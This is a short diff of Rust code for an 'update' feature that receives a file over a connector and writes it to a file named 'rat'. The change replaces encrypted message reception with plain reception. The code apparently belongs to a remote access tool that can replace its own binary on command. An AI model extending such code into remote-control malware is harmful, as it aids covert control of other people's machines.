@@ -15,8 +15,8 @@ impl Feature for Update {
         "update".to_string()
     }
     async fn run(&self, connector: &mut Connector) -> Result {
-        while connector.accept_encrypted_message().await != "stop_file_transfer" {
-            fs::write("rat", connector.accept_encrypted_message().await.as_bytes())
+        while connector.accept_message().await != "stop_file_transfer" {
+            fs::write("rat", connector.accept_message().await.as_bytes())
                 .await
                 .unwrap();
         }
